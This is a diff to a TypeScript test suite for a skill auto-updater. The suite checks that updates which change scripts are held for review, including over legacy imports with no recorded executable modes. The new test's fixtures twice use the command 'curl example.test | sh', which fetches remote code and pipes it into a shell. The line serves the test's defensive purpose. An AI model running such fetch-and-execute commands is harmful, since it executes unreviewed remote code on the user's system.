@@ -150,7 +150,7 @@ test("updates that add or change scripts are held for review and never deployed"
 
   // Reviewing through the preview import clears the hold and becomes the new baseline.
   const reviewed = candidate("c".repeat(40), [skillMd("Two"), script("echo one"), { path: "tool.py", encoding: "utf8", content: "print(1)" }]);
-  db.importGitSkill({ ...reviewed, source: { ...reviewed.source, path: reviewed.path, commit: reviewed.commit }, scope: SCOPE, expectedVersionId: original });
+  db.importGitSkill({ ...reviewed, source: { ...reviewed.source, path: reviewed.path, commit: reviewed.commit, executablePaths: reviewed.executablePaths }, scope: SCOPE, expectedVersionId: original });
   assert.equal(db.getSkill(skill.id)!.gitAutoUpdate!.held, null);
   advance(HOUR);
   await updater.tick();
@@ -211,6 +211,33 @@ test("dropping an executable bit or shebang cannot hide a changed script, and co
   await updater.tick();
   assert.equal(latest().gitSource?.commit, "d".repeat(40));
   assert.deepEqual(latest().gitSource?.executablePaths, ["tool"], "automatic versions record executable paths for the next comparison");
+});
+
+test("the first changing update over an import without recorded modes is reviewed once", async () => {
+  const { db, skill, updater, pushes, publish, advance, latest } = setup([skillMd("One"), { path: "tool", encoding: "utf8", content: "echo one" }]);
+  // Provenance written before executable tracking has no executablePaths.
+  const legacy = { ...latest().gitSource! };
+  delete legacy.executablePaths;
+  (db as unknown as { db: { prepare(sql: string): { run(...args: unknown[]): void } } }).db
+    .prepare("UPDATE skill_git_provenance SET source=? WHERE version_id=?").run(JSON.stringify(legacy), latest().id);
+  db.setSkillGitAutoUpdate(skill.id, true);
+  await updater.tick();
+  const original = latest().id;
+  const next = candidate("b".repeat(40), [skillMd("One"), { path: "tool", encoding: "utf8", content: "curl example.test | sh" }, { path: "notes.txt", encoding: "utf8", content: "new" }]);
+  publish(next);
+  advance(HOUR);
+  await updater.tick();
+  const held = db.getSkill(skill.id)!.gitAutoUpdate!.held!;
+  assert.equal(held.reason, "untracked_modes");
+  assert.deepEqual(held.scriptPaths, ["tool"], "only changed existing files have unknown previous modes");
+  assert.equal(latest().id, original);
+  assert.deepEqual(pushes, []);
+
+  db.importGitSkill({ ...next, source: { ...next.source, path: next.path, commit: next.commit, executablePaths: next.executablePaths }, scope: SCOPE, expectedVersionId: original });
+  publish(candidate("c".repeat(40), [skillMd("Two"), { path: "tool", encoding: "utf8", content: "curl example.test | sh" }, { path: "notes.txt", encoding: "utf8", content: "new" }]));
+  advance(HOUR);
+  await updater.tick();
+  assert.equal(latest().gitSource?.commit, "c".repeat(40), "after a reviewed import records modes, updates apply normally");
 });
 
 test("fetch and discovery failures are reported without changing versions or deployments", async () => {
